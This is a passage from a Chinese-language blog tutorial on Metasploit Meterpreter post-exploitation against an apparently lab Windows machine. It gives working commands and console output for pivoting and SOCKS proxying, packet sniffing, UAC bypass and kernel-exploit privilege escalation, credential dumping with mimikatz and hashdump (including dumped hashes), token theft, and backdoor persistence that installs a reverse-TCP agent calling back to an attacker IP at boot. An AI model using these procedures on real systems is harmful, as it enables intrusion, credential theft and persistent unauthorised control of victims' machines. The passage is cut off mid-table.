class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集"><a href="#4-4-信息收集" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权"><a href="#4-5-提权" class="headerlink" title="4.5 提权"></a>4.5 提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure><p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p><p>msf提供了如下几个模块帮助绕过UAC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure><p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure><p>3.内核漏洞提权</p><p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证"><a href="#4-6-获取凭证" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p><p>1.使用mimikatz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>3.post/windows/gather/smart_hashdump</p><p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>4.powerdump<br>同 hashdump，但失败了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌"><a href="#4-7-假冒令牌" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p><p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门"><a href="#4-8-植入后门" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p><p>1.persistence启动项后门</p><p>路径：metasploit/scripts/meterpreter/persistence</p><p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure><p>能实现同样功能的脚本还有：exploit/windows/local/persistence</p><p>2.metsvc服务后门</p><p>在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure><p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p><p>3.persistence_exe</p><p>再来看看官方推荐的东西吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module 